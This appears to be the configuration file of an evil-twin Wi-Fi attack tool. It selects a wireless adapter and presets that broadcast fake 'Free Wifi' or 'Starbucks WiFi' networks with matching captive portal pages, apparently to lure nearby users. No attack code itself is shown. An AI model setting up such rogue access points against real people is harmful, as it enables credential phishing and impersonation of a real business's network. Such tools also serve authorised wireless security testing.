main_file_name = "evil_twin.py"
start = 'run_eviltwin()'

WLAN = {
    "TP_LINK_ADAPTER": {"WLAN": "wlan1"},
    "INTERNAL_WIFI_CHIP": {"WLAN": "wlan0"},
}

WIFI_PRESETS = {

    "PRESET: FREE WIFI": { "ssid": "Free Wifi", "portal": "free_wifi.html" },
    "PRESET: STARBUCKS WIFI": { "ssid": "Starbucks WiFi", "portal": "starbucks_wifi.html" },
}

# Active preset selection: choose one of the keys from WIFI_PRESETS and one of the keys from WLAN
# Example selects the "PRESET: FREE WIFI" preset and the "TP_LINK_ADAPTER" WLAN adapter
ACTIVE_PRESET = {
    "preset": "PRESET: FREE WIFI",
    "WLAN": "TP_LINK_ADAPTER",
}